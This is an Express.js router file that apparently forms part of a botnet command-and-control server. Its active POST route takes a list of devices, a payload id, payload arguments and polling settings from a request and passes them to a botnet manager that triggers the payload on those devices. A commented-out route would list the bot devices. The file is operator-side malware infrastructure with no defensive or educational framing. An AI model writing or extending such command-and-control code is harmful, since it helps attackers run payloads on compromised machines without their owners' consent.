const express = require('express');
const botnetManager = require('../socket/botnet');

const botnetRouter = express.Router();

botnetRouter
    /*.get("/", (req, res) => {
        botnetManager.showAllDevices()
            .then((devices) => {
                res.json(devices);
            })
            .catch((error) => {
                console.log(error);
                res.status(500).json({error: error});
            });
    })*/
    .post("/", (req, res) => {
        const devices = req.body.devices;
        const payloadId = req.body.payload_id;
        const payloadArgs = req.body.payload_args;
        const polling = req.body.polling;
        const num = req.body.num;

        if (payloadId) {
            botnetManager.triggerDevices(devices, payloadId, payloadArgs, polling, num)
                .then(values => {
                    res.json(values);
                })
                .catch( error => {
                    res.status(500).json({error: "error on execution"});
                })

        } else {
            res.status(401).json({error: "Missing payload_id body parameter"});
        }
    })

module.exports = botnetRouter;